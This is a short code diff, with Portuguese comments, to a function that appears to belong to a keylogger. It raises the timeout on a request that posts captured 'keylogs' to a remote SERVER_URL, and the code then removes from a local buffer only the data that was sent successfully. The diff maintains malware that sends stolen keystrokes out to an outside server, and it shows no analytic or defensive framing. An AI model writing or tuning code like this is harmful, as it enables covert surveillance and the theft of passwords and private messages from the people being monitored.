@@ -21,7 +21,7 @@ def enviar_para_nuvem():
         
         if dados_para_enviar:
             try:
-                res = requests.post(SERVER_URL, data={'keylogs': dados_para_enviar}, timeout=10)
+                res = requests.post(SERVER_URL, data={'keylogs': dados_para_enviar}, timeout=30)
                 if res.status_code == 200:
                     with lock:
                         # Remove apenas o que foi enviado com sucesso
